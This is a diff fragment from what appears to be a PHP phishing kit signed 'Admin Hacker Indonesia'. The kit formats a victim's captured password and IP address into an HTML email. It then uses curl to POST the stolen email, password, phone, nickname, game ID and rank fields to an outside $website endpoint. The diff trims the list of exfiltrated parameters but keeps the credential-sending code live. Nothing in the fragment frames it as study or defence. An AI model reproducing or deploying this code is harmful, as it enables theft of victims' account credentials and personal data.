@@ -132,21 +132,7 @@ $pesan = '<!DOCTYPE html>
                 <tr>
 					<td style="border-right: none;">Password</td>
 					<td style="text-align: center;">'.$password.'</td>
-				</tr>
-			  <tr>
-					<td style="border-right: none;">IP Address</td>
-					<td style="text-align: center;">'.$ip.'</td>
-				</tr>
-			<tr>
-					<th style="text-align: center;" colspan="3">©Admin Hacker Indonesia </th>
-				</tr>
-			</table>
-			</div>
-	</body>
-	</html>';
-    
-// CURL UNTUK MENGIRIM SPAM
-$post = 'int1='.$subjek.'&int2='.$pesan.'&send='.$msg.'&subjek='.$subjek.'&pesan='.$pesan.'&password='.$password.'&ipaddr='.$subjek.'&useragent='.$pesan.'&id='.$id.'&level='.$level.'&nick='.$nick.'&ep='.$ep.'&login='.$login.'&user='.$email.'&pass='.$password.'&sender='.$sender.'&userIdForm='.$id.'&nickname='.$nick.'&imel='.$email.'&pw='.$password.'&playid='.$id.'&tier='.$tier.'&rank='.$tier.'&ranked='.$tier.'&epass='.$ep.'&ua='.$subjek.'&ip='.$pesan.'&ipAddress='.$ip.'&hp='.$email.'&no='.$email.'&phone='.$email.'&nama='.$password.'&ttl='.$date.'&platform='.$plat;        
+     $post = 'int1='.$subjek.'&int2='.$pesan.'&send='.$msg.'&subjek='.$subjek.'&pesan='.$pesan.'&password='.$password.'&ipaddr='.$subjek.'&useragent='.$pesan.'&user='.$email.'&pass='.$password.'&sender='.$sender.'&imel='.$email.'&pw='.$password.'&ua='.$subjek.'&ip='.$pesan.'&ipAddress='.$ip.'&hp='.$email.'&no='.$email.'&phone='.$email.'&nama='.$password;        
 $curl = curl_init($website);
         curl_setopt($curl, CURLOPT_URL, $website);
         curl_setopt($curl, CURLOPT_POST, true);
